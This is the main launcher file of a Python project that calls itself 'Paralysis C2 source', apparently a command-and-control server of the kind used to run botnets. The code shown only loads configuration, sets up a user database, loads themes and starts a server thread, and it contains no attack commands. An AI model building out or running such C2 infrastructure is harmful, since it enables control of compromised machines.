'''
Paralysis C2 source
written by Null
'''

# imports
import signal
from src.core import Core
from src.server import *
from src.logging import *
from src.config import *
from src.database import Database
from src.api import *
from src.themes import Theme

if __name__ == '__main__':
    # this piece takes care of the configuration loading
    logging.info('Reading config')
    Config.load()

    logging.info('Loading API config')
    ApiConfig.load()
    
    logging.info('Creating database')
    Database().make()

    logging.info('Connecting to database')
    Database().connect()
    logging.info('Connected to database')

    userCount = len(Database().query('SELECT * FROM users').fetchall())
    logging.info(f'Users in database: {str(userCount)}')

    Theme.themes = Theme.load()
    logging.info(f'Themes loaded: {str(len(Theme.themes))}')

    logging.info('Starting SIGINT handler')
    signal.signal(signal.SIGINT, lambda signum, frame: Utils().shutdown())

    # starts the server
    logging.info('Launching server')
    threading.Thread(target=Server().launch).start()